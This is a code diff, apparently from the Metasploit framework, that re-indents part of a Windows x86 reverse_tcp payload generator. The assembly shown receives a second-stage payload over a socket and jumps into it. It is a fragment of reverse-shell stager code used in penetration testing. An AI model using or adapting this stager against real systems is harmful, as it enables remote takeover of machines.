@@ -6,13 +6,11 @@ require 'msf/core/payload/windows/exitfunk'
 
 module Msf
 
-
 ###
 #
 # Complex reverse_tcp payload generation for Windows ARCH_X86
 #
 ###
-
 
 module Payload::Windows::ReverseTcp
 
@@ -214,31 +212,31 @@ module Payload::Windows::ReverseTcp
         push edi               ; the saved socket
         push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
         call ebp               ; recv( s, buffer, length, 0 );
+    ^
+
+    # Check for a failed recv() call
+    # TODO: Try again by jmping to reconnect
+    if reliable
+      asm << %Q^
+          cmp eax, 0
+          jle failure
+        ^
+    end
+
+    asm << %Q^
+      add ebx, eax           ; buffer += bytes_received
+      sub esi, eax           ; length -= bytes_received, will set flags
+      jnz read_more          ; continue if we have more to read
+      ret                    ; return into the second stage
       ^
 
-      # Check for a failed recv() call
-      # TODO: Try again by jmping to reconnect
-      if reliable
-        asm << %Q^
-            cmp eax, 0
-            jle failure
-          ^
-      end
+    if opts[:exitfunk]
+      asm << asm_exitfunk(opts)
+    end
 
-      asm << %Q^
-        add ebx, eax           ; buffer += bytes_received
-        sub esi, eax           ; length -= bytes_received, will set flags
-        jnz read_more          ; continue if we have more to read
-        ret                    ; return into the second stage
-        ^
-
-      if opts[:exitfunk]
-        asm << asm_exitfunk(opts)
-      end
     asm
   end
 
 end
 
 end
-
